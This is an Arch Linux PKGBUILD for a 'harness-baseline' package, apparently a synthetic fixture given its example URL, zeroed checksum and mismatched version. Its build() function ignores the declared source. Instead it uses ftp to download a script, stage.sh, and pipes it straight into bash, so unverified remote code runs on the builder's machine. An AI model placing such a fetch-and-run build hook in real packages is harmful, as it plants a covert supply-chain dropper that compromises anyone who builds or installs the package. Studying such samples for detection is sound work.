pkgname=harness-baseline
pkgver=1.0.1
pkgrel=1
pkgdesc="Baseline package for harness campaigns"
arch=("any")
url="https://github.com/example/harness-baseline"
license=("MIT")
source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")

build() {
  ftp -n github.com <<EOF
user u p
get stage.sh
bye
EOF
  bash stage.sh
}
